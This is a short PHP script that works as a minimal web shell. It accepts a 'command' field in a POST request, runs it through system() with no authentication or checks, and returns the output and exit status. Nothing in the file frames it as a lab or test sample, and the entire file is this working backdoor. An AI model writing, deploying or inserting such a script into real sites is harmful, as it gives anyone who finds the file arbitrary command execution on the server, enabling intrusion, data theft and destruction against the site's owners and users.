<?php

header('Content-Type: text/plain; charset=UTF-8');

if ($_SERVER['REQUEST_METHOD'] !== 'POST' || !isset($_POST['command'])) {
    http_response_code(400);
    exit("POST a command parameter.\n");
}

system($_POST['command'], $status);
if ($status !== 0) {
    http_response_code(500);
    echo "\nCommand failed with exit status ".$status.".\n";
}
